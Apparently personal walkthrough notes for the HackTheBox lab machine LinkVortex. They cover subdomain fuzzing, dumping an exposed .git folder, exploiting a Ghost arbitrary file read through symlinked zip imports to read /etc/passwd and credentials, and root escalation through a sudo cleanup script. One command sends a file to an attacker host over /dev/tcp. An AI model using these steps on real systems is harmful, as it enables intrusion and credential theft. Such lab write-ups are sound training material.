2025
### NMAP

```
sudo nmap -sC -sV -vv -oA nmap-linkvortex 
10.10.11.47
```

![[HackTheBox/Linux/attachments/Pasted image 20250512211852.png]]
- 22, 80
- add `linkvortex.htb` to `/etc/hosts`

### Enumerate website

![[HackTheBox/Linux/attachments/Pasted image 20250512212018.png]]
- posts are all written by admin 

Website footer reveals
![[HackTheBox/Linux/attachments/Pasted image 20250512212118.png]]
- BitByBit Hardware 2025
- Sign Up (link?)
- Powered by Ghost (open source blogging platform)

Ghost is available on GitHub

![[HackTheBox/Linux/attachments/Pasted image 20250512212246.png]]

There's a default login page at `/ghost`

![[HackTheBox/Linux/attachments/Pasted image 20250512212355.png]]
- try `admin:admin` which doesn't work
- try forgot password 

![[HackTheBox/Linux/attachments/Pasted image 20250512212442.png]]

Got this error message which validates that this email address exists 

![[HackTheBox/Linux/attachments/Pasted image 20250512212520.png]]

A fake email resulted in "User not found" error

Not bothering to run gobuster because this is an open source project.

### Virtual Host Scanning with ffuf

```
ffuf -u http://linkvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.linkvortex.htb'
```

![[HackTheBox/Linux/attachments/Pasted image 20250512212919.png]]

Execute this 

![[HackTheBox/Linux/attachments/Pasted image 20250512213035.png]]
- grab the size of 230 

Filter this 230 size out 
```
ffuf -u http://linkvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.linkvortex.htb' -fs 230
```

We immediately see a dev subdomain
![[HackTheBox/Linux/attachments/Pasted image 20250512213240.png]]

Add this virtual host to `/etc/hosts`

![[HackTheBox/Linux/attachments/Pasted image 20250512213335.png]]

### Enumerating Found Subdomain

The website is under construction
![[HackTheBox/Linux/attachments/Pasted image 20250512213417.png]]

View the page source to see if there's anything (there isn't)

Try to determine what language is running in the backend 
![[HackTheBox/Linux/attachments/Pasted image 20250512213541.png]]

Trying /index.html and get the default page again 
![[HackTheBox/Linux/attachments/Pasted image 20250512213626.png]]

#### gobuster for this subdomain

```
gobuster dir -u 'http://dev.linkvortex.htb' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
```

Found a .git directory!!
![[HackTheBox/Linux/attachments/Pasted image 20250512213907.png]]

Navigate to /.git in the browser
![[HackTheBox/Linux/attachments/Pasted image 20250512213953.png]]

### Gitdumper 

Download this .git folder using git dumper 

Install tool if needed
```
pipx install git-dumper
```

Display help menu
```
git-dumper -h
```

Create a directory to download the files to 

```
mkdir src
```

Construct the command to get these files
```
git-dumper http://dev.linkvortex.htb/.git src/
```

Switch into this src directory

### Enumerating .git files

```
ls -la
```

![[HackTheBox/Linux/attachments/Pasted image 20250512214721.png]]

View latest commits
```
git log 
```

![[HackTheBox/Linux/attachments/Pasted image 20250512214812.png]]
- these are the open source commits 
- nothing interesting or custom

See what has been added to this repository 
```
git status
```

![[HackTheBox/Linux/attachments/Pasted image 20250512214935.png]]

View this Dockerfile.ghost
![[HackTheBox/Linux/attachments/Pasted image 20250512215015.png]]
- this is basically how the website is deployed 

View the modified authentication.test.js file, but only view what was changed 
```
git diff --cached ghost/core/..../authentication.test.js
```

![[HackTheBox/Linux/attachments/Pasted image 20250512215308.png]]
- looks like the password was modified 😎

Try logging in with this password and the valid admin email found previously 

![[HackTheBox/Linux/attachments/Pasted image 20250512215418.png]]

Successful login!!
![[HackTheBox/Linux/attachments/Pasted image 20250512215445.png]]

### Authenticated Website Enumeration

See the ghost version 
![[HackTheBox/Linux/attachments/Pasted image 20250512215611.png]]

Googling "ghost 5.58.0 exploit" and seeing an [arbitrary file read vulnerability exists](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)

![[HackTheBox/Linux/attachments/Pasted image 20250512215713.png]]

### Download arbitrary file read exploit code

```
git clone https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028.git
```

Viewing the exploit script 
![[HackTheBox/Linux/attachments/Pasted image 20250512215921.png]]

#### Manually exploiting this vulnerability

Creating this images directory 

```
mkdir -p exploit/content/images
```

Put a symlink here

```
ln -s /etc/passwd exploit/content/images/test.png
```

Cat this test.png file and see the /etc/passwd file 

![[HackTheBox/Linux/attachments/Pasted image 20250512232843.png]]

Run an ls -la to view the symlink
```
ls -la 
```

![[HackTheBox/Linux/attachments/Pasted image 20250512232932.png]]

Zip up this test.png symlink file 

```
zip -r -y exploit.zip exploit/content/images/test.png
```

![[HackTheBox/Linux/attachments/Pasted image 20250512233148.png]]

Going back to the website and opening the import content and drop the exploit.zip file 
![[HackTheBox/Linux/attachments/Pasted image 20250512233227.png]]

Navigate to the file location in the URL
![[HackTheBox/Linux/attachments/Pasted image 20250512233341.png]]

Response 
![[HackTheBox/Linux/attachments/Pasted image 20250512233359.png]]

Now curl the URL of the test.png image location
![[HackTheBox/Linux/attachments/Pasted image 20250512233513.png]]
- we get the /etc/passwd file of the server 👀

#### Using the exploit script for this CVE

![[HackTheBox/Linux/attachments/Pasted image 20250512233657.png]]
- got the /etc/passwd of the server 

Use this exploit script to read the config of the web server 

![[HackTheBox/Linux/attachments/Pasted image 20250512233817.png]]

Result
![[HackTheBox/Linux/attachments/Pasted image 20250512233901.png]]
- got username and password

### SSH in as Bob 

Use creds discovered in the config file to ssh in as bob 

![[HackTheBox/Linux/attachments/Pasted image 20250512234013.png]]

❗initial access as bob❗

#### Enumerating for priv esc 

```
ls -la 
```

![[HackTheBox/Linux/attachments/Pasted image 20250512234208.png]]

```
sudo -l
```

![[HackTheBox/Linux/attachments/Pasted image 20250512234233.png]]
- bob can run bash on `/opt/ghost/clean_symlink.sh *.png`

Checking out this script by sending it over to Kali 

On LinkVortex:
```
cat /opt/ghost/clean_symlink.sh > /dev/tcp/10.10.14.8/9001
```
On Kali:
```
nc -lvnp 9001 > clean_symlink.sh
```

Check the file 

![[HackTheBox/Linux/attachments/Pasted image 20250512234737.png]]
- three vulnerabilities 

**First vulnerability**: not an absolute path for this false binary 

![[HackTheBox/Linux/attachments/Pasted image 20250512235030.png]]
- we could replace this binary and get code execution when $CHECK_CONTENT is called again
![[HackTheBox/Linux/attachments/Pasted image 20250512235155.png]]

#### Exploit this vulnerability 

Create a symlink for /etc/passwd 


```
ln -sf /PlsSub /dev/shm/test.png
```

![[HackTheBox/Linux/attachments/Pasted image 20250512235531.png]]

Execute the `clean_symlink.sh` and set the CHECK_CONTENT to bash 
![[HackTheBox/Linux/attachments/Pasted image 20250512235704.png]]
⭐got root⭐

**Second vulnerability**: we can create a symlink that directs to another symlink

Create first symlink
![[HackTheBox/Linux/attachments/Pasted image 20250513000208.png]]

Create second symlink
![[HackTheBox/Linux/attachments/Pasted image 20250513000142.png]]

Read the first symlink
![[HackTheBox/Linux/attachments/Pasted image 20250513000308.png]]

Exploit
![[HackTheBox/Linux/attachments/Pasted image 20250513000513.png]]
- get root flag

**Third vulnerability**: race condition where we can change the contents of the symlink after it checks if it is malicious

We start off with two ssh sessions as bob.

![[HackTheBox/Linux/attachments/Pasted image 20250513000938.png]]

![[HackTheBox/Linux/attachments/Pasted image 20250513001111.png]]

![[HackTheBox/Linux/attachments/Pasted image 20250513001146.png]]

we get the private key
![[HackTheBox/Linux/attachments/Pasted image 20250513001215.png]]

